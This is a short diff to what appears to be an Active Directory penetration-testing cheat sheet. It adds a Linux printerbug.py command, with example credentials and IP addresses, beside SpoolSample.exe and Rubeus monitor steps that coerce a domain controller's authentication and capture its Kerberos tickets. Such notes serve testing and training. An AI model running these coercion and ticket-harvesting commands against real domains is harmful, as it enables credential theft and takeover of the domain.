@@ -205,6 +205,8 @@ ls \\dc01.contoso.local\pipe\spoolss
 ```
 # run this on domain joined computers
 spoolsample.exe dc01.contoso.local ms01.contoso.local
+# or can use this command for linux workstation
+python3 printerbug.py contoso.local/donald:'Changeme123'@10.200.60.202 10.50.57.128
 
 # monitor ticket
 Rubeus.exe monitor /interval:5
